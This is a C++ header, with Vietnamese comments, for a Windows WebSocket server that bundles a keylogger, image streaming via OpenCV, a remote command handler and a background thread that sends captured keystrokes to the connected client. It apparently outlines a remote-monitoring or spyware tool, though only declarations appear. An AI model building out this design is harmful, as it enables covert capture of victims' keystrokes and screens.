
#pragma once
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <fstream>
#include <thread>
#include <vector>
#include <map>
#include "KeyLogger.h"
#include <opencv2/opencv.hpp>
#include "Stream.h"
#include <mutex>


#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "bcrypt.lib") // Vẫn cần cho SHA-1

enum class WebSocketFrameType {
    TEXT_FRAME,
    BINARY_FRAME,
    CONTROL_FRAME,
    INCOMPLETE,
    ERROR_FRAME
};


class WebSocketServer {
public:
    WebSocketServer(const std::string& ip, int port);
    ~WebSocketServer();
    bool Start(std::atomic<bool>& isRunning);
    void Close();


private:
    std::string server_ip;
    int server_port;
    SOCKET server_socket;

    // Tích hợp Stream vào trong Server để quản lý
    Stream m_streamEngine;

    void handle_client(SOCKET client_socket);
    bool perform_handshake(SOCKET client_socket);
    bool receive_frame(SOCKET client_socket, std::vector<char>& out_frame);
    // ... (decode_websocket_frame giữ nguyên)
    WebSocketFrameType decode_websocket_frame(const std::vector<char>& frame, std::string& out_payload);

    void process_command(SOCKET client_socket, const std::string& cmd);

    bool send_data(SOCKET client_socket, const std::string& data, bool isBinary);
    // HÀM MỚI: Gửi ảnh Binary
    bool SendImage(SOCKET client_socket, const std::vector<uchar>& buffer);

    std::string calculate_accept_key(const std::string& client_key);


    KeyLogger m_keylogger;       // Đối tượng KeyLogger
    std::mutex m_sendMutex;      // Khóa bảo vệ khi gửi dữ liệu (tránh xung đột giữa ảnh và phím)

    // Hàm chạy ngầm để gửi phím về Client
    void KeyLogSender(SOCKET client_socket);
};